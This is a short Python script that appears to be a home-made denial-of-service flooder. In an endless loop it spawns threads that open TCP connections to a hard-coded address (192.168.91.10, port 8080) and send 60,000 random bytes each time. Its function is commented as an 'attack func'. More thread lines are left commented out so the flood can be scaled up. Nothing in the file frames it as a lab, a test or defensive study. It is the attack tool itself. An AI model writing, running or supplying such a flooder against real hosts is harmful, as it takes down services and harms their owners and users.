#encoding:utf-8
import socket,threading,random

def server(ip,port): #attack func
    info = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #tcp/udp
    info.connect((ip,port))
    info.sendto(data,(ip,port))
    info.close()
if __name__ == '__main__':
    ip ='192.168.91.10'
    port = 8080
    data = random._urandom(60000)

    while True:
        t1 = threading.Thread(target=server, args=(ip,port))
        t2 = threading.Thread(target=server, args=(ip, port))
        # t3 = threading.Thread(target=server, args=(ip, port))
        # t4 = threading.Thread(target=server, args=(ip, port))
        # t11 = threading.Thread(target=server, args=(ip, port))
        # t12 = threading.Thread(target=server, args=(ip, port))
        # t13 = threading.Thread(target=server, args=(ip, port))
        # t14 = threading.Thread(target=server, args=(ip, port))
        t1.start()
        t2.start()
        # t3.start()
        # t4.start()
        # t11.start()
        # t12.start()
        # t13.start()
        # t14.start()


        print('start')
